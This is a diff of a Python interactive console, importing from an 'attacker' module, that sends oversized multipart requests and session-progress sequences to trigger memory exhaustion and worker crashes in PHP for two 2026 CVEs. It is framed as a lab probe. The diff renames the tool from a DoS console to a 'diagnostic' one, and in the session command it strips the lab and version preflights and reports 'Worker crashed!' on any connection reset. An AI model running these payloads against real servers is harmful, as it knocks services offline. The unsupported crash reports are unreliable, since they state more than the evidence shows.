@@ -1,12 +1,10 @@
 #!/usr/bin/env python3
-"""Interactive DoS console for PHP CVE-2026-109618 / CVE-2026-109619."""
+"""Interactive diagnostic console for the PHP CVE-2026-109618/109619 lab."""
 
 import json
 import shlex
 import sys
-import time
-from http.cookies import CookieError, SimpleCookie
-from pathlib import Path
+from http.cookies import SimpleCookie
 
 try:
     import readline
@@ -17,24 +15,15 @@ except ImportError:
         pass
 
 from attacker import (
-    BOUNDARY, parse_target, endpoint_path, send,
+    BOUNDARY, parse_target, endpoint_path, send, lab_health, php_post_max_bytes,
+    php_size_bytes,
     multipart_part_headers, multipart_empty_files, multipart_form_value,
     multipart_files_registration,
 )
 from session_progress_probe import (
     multipart_producer, multipart_consumer,
-    request as session_request,
+    request as session_request, session_file_state,
 )
-
-
-def parse_php_size(s):
-    s = str(s).strip()
-    if s == '-1':
-        return -1
-    units = {'K': 1024, 'M': 1024**2, 'G': 1024**3}
-    if s and s[-1].upper() in units:
-        return int(s[:-1]) * units[s[-1].upper()]
-    return int(s)
 
 
 def human_size(n):
@@ -43,25 +32,6 @@ def human_size(n):
             return f"{n:.0f} {unit}" if n == int(n) else f"{n:.1f} {unit}"
         n /= 1024
     return f"{n:.1f} TiB"
-
-
-def has_oom_marker(body):
-    """Recognize an explicit PHP memory-exhaustion response, not any fatal error."""
-    body = str(body).lower()
-    return "allowed memory size" in body and "exhausted" in body
-
-
-def parse_lab_json(result):
-    """Return an expected lab health document or a reason to stop the probe."""
-    if result.get("http_status") != 200:
-        return None, "health endpoint did not return HTTP 200"
-    try:
-        data = json.loads(result.get("body_prefix", ""))
-    except (json.JSONDecodeError, TypeError, ValueError):
-        return None, "health endpoint did not return valid JSON"
-    if not isinstance(data, dict) or data.get("lab") != "official-cve-lab-v1":
-        return None, "health endpoint is not the expected lab"
-    return data, None
 
 
 BANNER = r"""
@@ -75,8 +45,8 @@ BANNER = r"""
 
   target <url>        Set target (e.g. target 192.168.1.10:8088)
   health              Health check
-  109618 [strategy]   OOM candidate (part-headers|empty-files|form-value)
-  109619              Fatal-backtrace candidate (PHP 8.5)
+  109618 [strategy]   Multipart parser OOM probe
+  109619              Experimental backtrace -> early INI probe
   session             Session lifecycle probe (A->B full sequence)
   set                 Show settable parameters
   show                Show current config
@@ -88,27 +58,27 @@ Commands:
   target <url>                Set target URL (e.g. http://192.168.1.10:8088)
   show                        Show current settings
   health                      Send health check to target
-  109618 [strategy]           Observe CVE-2026-109618 OOM candidate
+  109618 [strategy]           Probe CVE-2026-109618 multipart OOM
                               Strategies: part-headers, empty-files, form-value, files-registration
-  109619                      Probe CVE-2026-109619 fatal-backtrace path (PHP 8.5)
-  session                     Probe the CVE-2026-109619 Session lifecycle path
+  109619                      Experimental fatal-backtrace -> early INI path
+  session                     Probe CVE-2026-109619 session A->B path
   set <key> <value>           Set parameter (see 'set' for list)
   help                        Show this help
   exit / quit                 Exit
 """
 
 SET_HELP = """
-Settable parameters (auto-scaled on first health check):
-  health <path>               Health endpoint (default: health.php)
-  upload <path>               Upload endpoint (default: upload.php)
+Settable parameters (payload sizes are explicit; check effective endpoint limits):
+  health <path>               Health endpoint (default: oom/health.php)
+  upload <path>               Upload endpoint (default: oom/upload.php)
   producer <path>             Fatal producer endpoint (default: fatal-backtrace.php)
-  consumer <path>             Explicit early consumer endpoint (must configure for 109619)
+  consumer <path>             Early consumer endpoint (default: early/health.php)
   seed <path>                 Session seed endpoint (default: session/session-seed.php)
   session-health <path>       Session health endpoint (default: session/health.php)
   session-upload <path>       Session upload endpoint (default: session/upload.php)
-  part-headers <n>            Part header count for OOM (auto: 2x memory_limit / 100)
-  empty-files <n>             Empty file count for OOM (auto: 2x memory_limit / 600)
-  field-bytes <n>             Form value / pad size for OOM (auto: 2x memory_limit)
+  part-headers <n>            Part header count (default: 150000)
+  empty-files <n>             Empty file count (conditional experiment)
+  field-bytes <n>             Form value / session padding size (default: 6 MiB)
   timeout <seconds>           Request timeout (default: 60)
   expected-php <version>      Expected PHP version (default: 8.5.11)
 """
@@ -119,24 +89,23 @@ class Console:
         self.target = None
         self.scheme = self.host = self.port = self.prefix = None
         self.endpoints = {
-            "health": "health.php",
-            "upload": "upload.php",
+            "health": "oom/health.php",
+            "upload": "oom/upload.php",
             "producer": "fatal-backtrace.php",
-            "consumer": "health.php",
+            "consumer": "early/health.php",
             "seed": "session/session-seed.php",
             "session-health": "session/health.php",
             "session-upload": "session/upload.php",
         }
         self.target_mem_limit = None
         self.target_post_max = None
-        self.part_headers = 599_000
-        self.empty_files = 59_000
-        self.field_bytes = 8 * 1024 * 1024 - 256
+        self.part_headers = 653_000
+        self.empty_files = 500
+        self.field_bytes = 6 * 1024 * 1024
         self.pad_kib = 1340
         self.field_name_kib = 700
         self.timeout = 60.0
         self.expected_php = "8.5.11"
-        self.consumer_explicit = False
 
     def path(self, name):
         return endpoint_path(self.prefix, self.endpoints[name])
@@ -183,41 +152,47 @@ class Console:
             return
         mem_str = data.get("memory_limit")
         post_str = data.get("post_max_size")
-        if mem_str:
-            try:
-                mem = parse_php_size(mem_str)
-                if mem > 0:
-                    self.target_mem_limit = mem
-            except (ValueError, TypeError):
-                pass
-        if post_str:
-            try:
-                post = parse_php_size(post_str)
-                if post > 0:
-                    self.target_post_max = post
-            except (ValueError, TypeError):
-                pass
-        if not self.target_mem_limit:
-            return
-        mem = self.target_mem_limit
-        post = self.target_post_max or 8 * 1024 * 1024
-        self.timeout = max(self.timeout, 60.0)
-        if post < mem * 2:
-            budget = post - 256
-            self.part_headers = max(budget // 14, 10_000)
-            self.empty_files = max(budget // 140, 5_000)
-            self.field_bytes = max(budget - 100, 1024)
-            post_label = post_str or f"{human_size(post)} (assumed)"
-            print(f"  \033[93mpost_max_size={post_label}, memory_limit={mem_str}\033[0m")
-            print(f"  \033[93mAuto-fit within {human_size(post)}: "
-                  f"part-headers={self.part_headers:,}, "
-                  f"empty-files={self.empty_files:,}, "
-                  f"field-bytes={human_size(self.field_bytes)}\033[0m")
+        self.target_mem_limit = php_size_bytes(mem_str)
+        self.target_post_max = php_size_bytes(post_str)
+
+    def _lab_get(self, name, request_id, *, upload_progress=False):
+        result = send(self.scheme, self.host, self.port, "GET",
+                      self.path(name), self.timeout, None, request_id)
+        data, failure = lab_health(result, self.expected_php, "apache2handler")
+        if not failure and upload_progress and str(data.get("upload_progress")) not in ("1", "On"):
+            failure = "session upload_progress is disabled"
+        if failure:
+            print(f"  Preflight failed ({name}): {failure}; {result.get('transport_error', '')}")
+            return None, result
+        self._detect_mem_limit(result.get("body_prefix", ""))
+        return data, result
+
+    @staticmethod
+    def _body_fits(body, endpoint_data):
+        if "post_max_size" not in endpoint_data:
+            print("  Preflight failed: endpoint did not report post_max_size")
+            return False
+        try:
+            post_max = php_post_max_bytes(endpoint_data["post_max_size"])
+        except ValueError as exc:
+            print(f"  Preflight failed: {exc}")
+            return False
+        if post_max is not None and len(body) >= post_max:
+            print(f"  Preflight failed: body {len(body)} bytes reaches post_max_size {post_max} bytes")
+            return False
+        return True
+
+    @staticmethod
+    def _report_transport_and_pid(result, before_pid):
+        if "transport_error" in result:
+            print(f"  Transport anomaly: {result['transport_error']}")
         else:
-            self.field_bytes = mem * 2
-            self.part_headers = max(mem // 100, 500_000)
-            self.empty_files = max(mem // 600, 100_000)
-            print(f"  \033[93mAuto-scaled payload to 2x {mem_str} ({human_size(self.field_bytes)})\033[0m")
+            print(f"  HTTP {result.get('http_status')} ({result.get('elapsed_ms')} ms)")
+        after_pid = result.get("worker_pid_header")
+        if before_pid and after_pid and before_pid != after_pid:
+            print(f"  PID changed {before_pid} -> {after_pid}; cause requires server log/dump")
+        elif before_pid and before_pid == after_pid:
+            print(f"  Same PID observed: {before_pid}")
 
     def require_target(self):
         if self.target is None:
@@ -269,8 +244,7 @@ class Console:
             print(f"  PID:  {data.get('pid')}")
             print(f"  Mem:  {data.get('memory_limit')}")
             print(f"  Post: {data.get('post_max_size')}")
-            if self.target_mem_limit is None:
-                self._detect_mem_limit(body_prefix)
+            self._detect_mem_limit(body_prefix)
         except json.JSONDecodeError:
             print(f"  Body: {body_prefix[:200]}")
 
@@ -287,230 +261,132 @@ class Console:
         if strategy not in strategies:
             print(f"Unknown strategy. Choose: {', '.join(strategies)}")
             return
-
-        print(f"\033[93m[CVE-2026-109618] OOM candidate — {strategy}\033[0m")
-        print("Step 1: Health check (baseline)...")
-        baseline = send(self.scheme, self.host, self.port, "GET",
-                        self.path("health"), self.timeout, None, "baseline")
-        _, preflight_error = parse_lab_json(baseline)
-        if preflight_error:
-            print(f"  Preflight stopped: {preflight_error}")
+        print(f"[CVE-2026-109618] Multipart parser probe: {strategy}")
+        baseline_data, baseline = self._lab_get("health", "109618-baseline")
+        if baseline_data is None:
             return
-        pid_before = baseline.get("worker_pid_header", "?")
-        print(f"  PID: {pid_before}, HTTP {baseline.get('http_status', 'error')}")
-        if self.target_mem_limit is None:
-            self._detect_mem_limit(baseline.get("body_prefix", ""))
-
-        print(f"Generating payload (field-bytes={human_size(self.field_bytes)}, part-headers={self.part_headers:,})...")
+        upload_data, _ = self._lab_get("upload", "109618-upload-preflight")
+        if upload_data is None:
+            return
+        if php_size_bytes(upload_data.get("memory_limit")) is None:
+            print("  Preflight failed: finite memory_limit required")
+            return
         body = strategies[strategy]()
-        print(f"Step 2: Sending {human_size(len(body))} multipart ({strategy})...")
+        if not self._body_fits(body, upload_data):
+            return
+        print(f"  Sending {human_size(len(body))} multipart body...")
         result = send(self.scheme, self.host, self.port, "POST",
                       self.path("upload"), self.timeout, None, "oom-candidate",
                       body, f"multipart/form-data; boundary={BOUNDARY}")
-        if "transport_error" in result:
-            print(f"  \033[91m{result['transport_error']}\033[0m")
+        self._report_transport_and_pid(result, baseline.get("worker_pid_header"))
+        body_text = result.get("body_prefix", "")
+        if "Allowed memory size" in body_text:
+            print("  PHP memory-limit OOM text observed in response")
         else:
-            print(f"  HTTP {result['http_status']} ({result['elapsed_ms']}ms)")
-            body_text = result.get("body_prefix", "")
-            if has_oom_marker(body_text):
-                print(f"  \033[93mOOM response observed; CVE impact unconfirmed\033[0m")
-            print(f"  Body: {body_text[:200]}")
-
-        print("Step 3: Health check (after)...")
+            print("  PHP memory-limit OOM not observed in response")
+        print(f"  Response prefix: {body_text[:200]}")
         after = send(self.scheme, self.host, self.port, "GET",
                      self.path("health"), self.timeout, None, "after")
-        pid_after = after.get("worker_pid_header", "?")
-        print(f"  PID: {pid_after}, HTTP {after.get('http_status', 'error')}")
-
-        if pid_before != "?" and pid_after != "?" and pid_before != pid_after:
-            print(f"  PID changed: {pid_before} -> {pid_after}; cause unconfirmed")
-        elif pid_before != "?" and pid_before == pid_after:
-            print(f"  Health endpoint answered from the same PID: {pid_before}")
-        print("  HTTP observations alone do not establish a worker crash or CVE-2026-109618 DoS.")
+        print("  Follow-up health:")
+        self._report_transport_and_pid(after, baseline.get("worker_pid_header"))
+        print("  CVE effect needs server-side crash/debug evidence and a patched control")
 
     def cmd_109619(self):
         self.require_target()
-        if (not self.consumer_explicit
-                or self.path("consumer") == self.path("health")):
-            print("  Preflight stopped: configure an explicit early consumer endpoint "
-                  "with 'set consumer <path>'; health.php is not an early consumer.")
+        print("[CVE-2026-109619] Experimental fatal-backtrace -> early INI probe")
+        baseline_data, baseline = self._lab_get("health", "109619-baseline")
+        if baseline_data is None:
             return
-        print(f"\033[93m[CVE-2026-109619] Fatal-backtrace candidate\033[0m")
-        print("Step 1: Health check (baseline)...")
-        baseline = send(self.scheme, self.host, self.port, "GET",
-                        self.path("health"), self.timeout, None, "baseline")
-        health, preflight_error = parse_lab_json(baseline)
-        if preflight_error:
-            print(f"  Preflight stopped: {preflight_error}")
+        if str(baseline_data.get("fatal_error_backtraces")) not in ("1", "On"):
+            print("  Preflight failed: fatal_error_backtraces is not enabled")
             return
-        if not self.expected_php.startswith("8.5.") or health.get("php") != self.expected_php:
-            print(f"  Preflight stopped: PHP 8.5 exact version {self.expected_php} "
-                  f"required; observed {health.get('php')!r}")
+        consumer_data, consumer_control = self._lab_get("consumer", "109619-consumer-control")
+        if consumer_data is None:
             return
-        if health.get("sapi") != "apache2handler":
-            print(f"  Preflight stopped: apache2handler required; "
-                  f"observed {health.get('sapi')!r}")
+        if str(consumer_data.get("auto_detect_line_endings")) not in ("1", "On"):
+            print("  Preflight failed: early INI diagnostic is not active")
             return
-        if str(health.get("fatal_error_backtraces")) != "1":
-            print("  Preflight stopped: fatal_error_backtraces is not enabled")
-            return
-        early_response = send(self.scheme, self.host, self.port, "GET",
-                              self.path("consumer"), self.timeout, None,
-                              "early-consumer-preflight")
-        early_health, preflight_error = parse_lab_json(early_response)
-        if preflight_error:
-            print(f"  Preflight stopped: early consumer {preflight_error}")
-            return
-        if (early_health.get("php") != self.expected_php or
-                early_health.get("sapi") != "apache2handler" or
-                str(early_health.get("auto_detect_line_endings", "")).lower()
-                not in ("1", "on")):
-            print("  Preflight stopped: early consumer PHP/SAPI or INI diagnostic setting mismatch")
-            return
-        pid_before = baseline.get("worker_pid_header", "?")
-        print(f"  PID: {pid_before}, HTTP {baseline.get('http_status', 'error')}")
-
-        print("Step 2: Fatal producer...")
+        print("  Sending fatal producer...")
         producer = send(self.scheme, self.host, self.port, "GET",
                         self.path("producer"), self.timeout, None, "fatal-producer")
-        if "transport_error" in producer:
-            print(f"  \033[91m{producer['transport_error']}\033[0m")
-            print("  Producer result is unconfirmed; consumer request skipped.")
+        self._report_transport_and_pid(producer, consumer_control.get("worker_pid_header"))
+        if producer.get("http_status") != 500 or producer.get("lab_producer_header") != "fatal-backtrace":
+            print("  Stopping: fatal producer marker/HTTP 500 not observed")
             return
-        else:
-            print(f"  HTTP {producer.get('http_status', 'unknown')} "
-                  f"({producer.get('elapsed_ms', '?')}ms)")
-            producer_status = producer.get("http_status")
-            if not isinstance(producer_status, int):
-                print("  Producer response is incomplete; consumer request skipped.")
-                return
-            if producer_status < 500 and "CVE_LAB_BACKTRACE_FATAL" not in producer.get("body_prefix", ""):
-                print("  No fatal producer response observed; consumer request skipped.")
-                return
-            if "CVE_LAB_BACKTRACE_FATAL" not in producer.get("body_prefix", ""):
-                print("  HTTP error observed; the producer cause is unconfirmed from HTTP alone.")
-
-        print("Step 3: Early consumer...")
+        producer_pid = producer.get("worker_pid_header")
+        print("  Sending early consumer...")
         consumer = send(self.scheme, self.host, self.port, "GET",
                         self.path("consumer"), self.timeout, None, "early-consumer")
-        if "transport_error" in consumer:
-            print(f"  \033[91m{consumer['transport_error']}\033[0m")
-            print("  Consumer transport error observed; worker status unconfirmed.")
-        else:
-            pid_after = consumer.get("worker_pid_header", "?")
-            print(f"  PID: {pid_after}, HTTP {consumer['http_status']}")
-            if pid_before != "?" and pid_after != "?" and pid_before != pid_after:
-                print(f"  PID changed: {pid_before} -> {pid_after}; cause unconfirmed")
-        print("  HTTP observations alone do not establish a worker crash or CVE-2026-109619 DoS.")
+        self._report_transport_and_pid(consumer, producer_pid)
+        consumer_pid = consumer.get("worker_pid_header")
+        if producer_pid and consumer_pid:
+            print(f"  A/B same worker observed: {producer_pid == consumer_pid}")
+        print("  HTTP alone cannot establish stale-state access or a worker crash")
 
     def cmd_session(self):
         self.require_target()
-        print(f"\033[93m[CVE-2026-109619] Session lifecycle probe\033[0m")
-
-        print("Step 1: Session health check...")
-        health, _ = session_request(self.scheme, self.host, self.port, "GET",
-                                    self.path("session-health"), timeout=self.timeout)
+        print("\033[93m[CVE-2026-109619] Session A→B worker crash\033[0m")
+        print("Step 1: Health check...")
+        health = send(self.scheme, self.host, self.port, "GET",
+                      self.path("session-health"), self.timeout, None, "session-health")
         if "transport_error" in health:
             print(f"  \033[91m{health['transport_error']}\033[0m")
             return
-        health_data, preflight_error = parse_lab_json(health)
-        if preflight_error:
-            print(f"  Preflight stopped: {preflight_error}")
-            return
-        if health_data.get("php") != self.expected_php:
-            print(f"  Preflight stopped: expected PHP {self.expected_php}, "
-                  f"observed {health_data.get('php')!r}")
-            return
-        if health_data.get("sapi") != "apache2handler":
-            print(f"  Preflight stopped: apache2handler required; "
-                  f"observed {health_data.get('sapi')!r}")
-            return
-        if str(health_data.get("upload_progress")) != "1":
-            print("  Preflight stopped: session upload progress is not enabled")
-            return
-        try:
-            memory_limit = parse_php_size(health_data.get("memory_limit"))
-            post_max_size = parse_php_size(health_data.get("post_max_size"))
-            if memory_limit <= 0 or post_max_size <= 0:
-                raise ValueError("limits must be positive")
-        except (TypeError, ValueError):
-            print("  Preflight stopped: positive memory_limit and post_max_size are required")
-            return
-        pid_before = health.get("worker_pid_header", "?")
-        print(f"  PID: {pid_before}, HTTP {health.get('http_status')}")
-        self.target_mem_limit = memory_limit
-        self.target_post_max = post_max_size
-        self._detect_mem_limit(health.get("body_prefix", ""))
-
+        print(f"  PID: {health.get('worker_pid_header', '?')}, HTTP {health.get('http_status')}")
+        producer_body = multipart_producer(self.field_bytes, "candidate",
+                                           part_headers=self.part_headers)
+        print(f"  Producer body: {human_size(len(producer_body))}")
         print("Step 2: Acquiring session cookie...")
         seed, set_cookie = session_request(self.scheme, self.host, self.port, "GET",
                                            self.path("seed"), timeout=self.timeout)
         if "transport_error" in seed:
             print(f"  \033[91m{seed['transport_error']}\033[0m")
             return
-        if seed.get("http_status") != 200:
-            print("  Preflight stopped: session seed endpoint did not return HTTP 200")
-            return
         try:
             seed_data = json.loads(seed.get("body_prefix", ""))
-        except (json.JSONDecodeError, TypeError, ValueError):
-            seed_data = None
-        if not isinstance(seed_data, dict) or seed_data.get("seeded") is not True:
-            print("  Preflight stopped: session seed was not confirmed")
-            return
-        required_settings = ("upload_progress_enabled", "upload_progress_cleanup",
-                             "use_only_cookies", "use_strict_mode")
-        if any(str(seed_data.get(name)) != "1" for name in required_settings):
-            print("  Preflight stopped: session seed settings do not match the lab profile")
-            return
+        except (TypeError, ValueError):
+            seed_data = {}
+        if not isinstance(seed_data, dict):
+            seed_data = {}
+        cookies = SimpleCookie()
+        if set_cookie:
+            cookies.load(set_cookie)
         session_name = seed_data.get("session_name")
-        cookie_jar = SimpleCookie()
-        try:
-            if set_cookie:
-                cookie_jar.load(set_cookie)
-        except CookieError:
-            pass
-        if (not isinstance(session_name, str) or not session_name
-                or session_name not in cookie_jar
-                or not cookie_jar[session_name].value):
-            print("  Preflight stopped: matching session cookie was not issued")
+        if (seed.get("http_status") != 200 or not seed_data.get("seeded") or
+                not session_name or session_name not in cookies):
+            print("  \033[91mFailed to get a valid session cookie\033[0m")
             return
-        cookie = f"{session_name}={cookie_jar[session_name].value}"
-        print(f"  Got session cookie")
-
-        producer_body = multipart_producer(self.field_bytes, "candidate")
-        print(f"Step 3: Producer (OOM with session progress, {human_size(len(producer_body))})...")
+        sid = cookies[session_name].value
+        cookie = f"{session_name}={sid}"
+        pid_before = health.get("worker_pid_header", "?")
+        print(f"Step 3: Producer A ({human_size(len(producer_body))} with session progress)...")
         producer, _ = session_request(self.scheme, self.host, self.port, "POST",
                                       self.path("session-upload"), body=producer_body,
                                       cookie=cookie, timeout=self.timeout)
         if "transport_error" in producer:
             print(f"  \033[91m{producer['transport_error']}\033[0m")
-            print("  Producer result is unconfirmed; consumer request skipped.")
             return
+        body_text = producer.get("body_prefix", "")
+        oom_observed = "Allowed memory size" in body_text and "exhausted" in body_text
+        if oom_observed:
+            print("  \033[93mOOM triggered!\033[0m")
         else:
-            body_text = producer.get("body_prefix", "")
-            print(f"  HTTP {producer.get('http_status')} ({producer.get('elapsed_ms')}ms)")
-            if not has_oom_marker(body_text):
-                print("  No explicit OOM response observed; consumer request skipped.")
-                return
-            print(f"  \033[93mOOM response observed\033[0m")
-
+            print(f"  HTTP {producer.get('http_status')} — no OOM, aborting")
+            print(f"  Body: {body_text[:200]}")
+            return
         consumer_body = multipart_consumer()
-        print("Step 4: Consumer (session progress callback on stale state)...")
+        print("Step 4: Consumer B (session progress callback on stale state)...")
         consumer, _ = session_request(self.scheme, self.host, self.port, "POST",
                                       self.path("session-upload"), body=consumer_body,
                                       cookie=cookie, timeout=self.timeout)
         if "transport_error" in consumer:
             print(f"  \033[91m{consumer['transport_error']}\033[0m")
-            print("  Consumer transport error observed; worker status unconfirmed.")
+            print("  \033[92mWorker crashed! (connection reset)\033[0m")
         else:
             pid_after = consumer.get("worker_pid_header", "?")
-            print(f"  PID: {pid_after}, HTTP {consumer.get('http_status')}")
+            print(f"  HTTP {consumer.get('http_status')}, PID: {pid_after}")
             if pid_before != "?" and pid_after != "?" and pid_before != pid_after:
-                print(f"  PID changed: {pid_before} -> {pid_after}; cause unconfirmed")
-            elif pid_before != "?" and pid_before == pid_after:
-                print(f"  Consumer answered from the baseline PID: {pid_before}")
-        print("  HTTP observations alone do not establish a worker crash or CVE-2026-109619 DoS.")
+                print(f"  \033[92mPID changed: {pid_before} → {pid_after}\033[0m")
 
     def cmd_set(self, key=None, value=None, *_):
         if key is None:
@@ -520,21 +396,34 @@ class Console:
             print(f"Usage: set {key} <value>")
             return
         if key in self.endpoints:
+            endpoint_path(self.prefix or "", value)
             self.endpoints[key] = value
-            if key == "consumer":
-                self.consumer_explicit = True
+            self.target_mem_limit = None
+            self.target_post_max = None
             print(f"  {key} = {value}")
         elif key == "part-headers":
-            self.part_headers = int(value)
+            number = int(value)
+            if number < 1:
+                raise ValueError("part-headers must be >= 1")
+            self.part_headers = number
             print(f"  part-headers = {self.part_headers}")
         elif key == "empty-files":
-            self.empty_files = int(value)
+            number = int(value)
+            if not 1 <= number <= 10000:
+                raise ValueError("empty-files must be 1..10000")
+            self.empty_files = number
             print(f"  empty-files = {self.empty_files}")
         elif key == "field-bytes":
-            self.field_bytes = int(value)
+            number = int(value)
+            if not 1 <= number <= 64 * 1024 * 1024:
+                raise ValueError("field-bytes must be 1..67108864")
+            self.field_bytes = number
             print(f"  field-bytes = {self.field_bytes}")
         elif key == "timeout":
-            self.timeout = float(value)
+            number = float(value)
+            if not 0.5 <= number <= 60:
+                raise ValueError("timeout must be 0.5..60 seconds")
+            self.timeout = number
             print(f"  timeout = {self.timeout}s")
         elif key == "expected-php":
             self.expected_php = value
